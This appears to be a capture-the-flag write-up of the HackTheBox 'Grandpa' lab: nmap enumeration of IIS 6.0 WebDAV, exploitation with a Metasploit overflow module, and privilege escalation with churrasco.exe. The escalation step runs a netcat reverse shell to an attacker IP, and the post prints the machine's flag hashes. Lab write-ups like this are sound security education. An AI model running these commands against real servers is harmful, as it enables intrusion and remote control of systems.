---
title: "HTB: Grandpa"
date: 2026-10-18 00:00:00 +0200
categories: [HackTheBox, Windows]
tags: [htb, windows, easy, iis, webdav, buffer-overflow, churrasco, privilege-escalation]
author: Ph4n3s
---

## Machine info

| Field       | Value                   |
|-------------|-------------------------|
| Name        | Grandpa                 |
| OS          | Windows                 |
| Difficulty  | Easy                    |
| IP          | 10.129.95.233           |

## 1. Enumeration

The first thing is to ping the machine to get an idea of the operating system. The returned TTL is 127, which — being close to 128 — tells us this is a Windows machine.

```
64 bytes from 10.129.95.233: icmp_seq=1 ttl=127 time=58.0 ms
```

### 1.1 Ports

I scan all ports to see which ones are open:

```
nmap -p- -open -T4 --min-rate 5000 10.129.95.233 -oN ~/HTB_machines/Grandpa/ports
```

Result:

```
PORT   STATE SERVICE
80/tcp open  http
```

We only have port 80 open. I refine the scan on that port to identify the technology and service version:

```
nmap -p 80 -sVC -T4 --min-rate 5000 10.129.95.233 -oN ~/HTB_machines/Grandpa/targeted
```

Result:

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sun, 18 Oct 2026 11:14:24 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

With this we can see the web server is a **Microsoft-IIS/6.0**, an old version associated with Windows Server 2003, known to be vulnerable to buffer overflow. We also see it runs **WebDAV**, which allows managing the server remotely without being physically in front of it. The exposed **Allowed Methods** are the most interesting point, as they let us perform certain actions that can be exploited against the service.

### 1.2 Searching for exploits

Since it is an old 2003 server, the key points to keep in mind are WebDAV, the buffer overflow and the Microsoft IIS/6.0 version. Searching `msfconsole` for a related exploit, I find the following, which is the one I will use:

```
exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```

## 2. Exploitation

First I try launching the exploit from my own machine, but since it is an old and poorly optimized system, it gives me errors when trying to migrate to a higher-privileged process within meterpreter. Because of that, I decide to use the Pwnbox.

In the payload I set `RHOSTS` to the machine's IP (10.129.95.233) and run `run`. After that the meterpreter session opens.

With `ps` I review the processes looking for one with user privileges, since later I will need to escalate privileges, and I migrate to process **1936** in order to continue with the escalation exploit.

For privilege escalation I need the **churrasco.exe** binary, available in the GitHub repository [Re4son/Churrasco](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe). I will upload it along with an **nc.exe** to open a privileged reverse shell from meterpreter.

From the open session I migrate to process **2378**, which is the one with permissions to upload files, and run:

```
upload /home/ph4n3s/churrasco.exe C:\\Windows\\Temp\\churrasco.exe
upload /usr/share/windows-resources/binaries/nc.exe C:\\Windows\\Temp\\nc.exe
```

With this I upload both binaries to `C:\Windows\Temp`: one for privilege escalation and one for the reverse shell.

After the upload, I open a `shell`, navigate to `C:\Windows\Temp` and, while leaving a listener on my attacking machine with:

```
nc -nvlp 5555
```

I run the following to get a reverse shell with elevated privileges:

```
churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.39 5555"
```

With this I receive the connection on the listener.

## 3. Post-exploitation

I navigate to `C:\Documents and Settings\Harry\Desktop` and `type` `user.txt` to get the user flag:

```
bdff5ec67c3cff017f2bedc146a5d869
```

I repeat the process, navigating to `C:\Documents and Settings\Administrator\Desktop` and `type` `root.txt` to get the administrator flag:

```
9359e905a2c35f861f6a57cecf28bb7b
```

---

Thanks for reading my write-up! 🎉
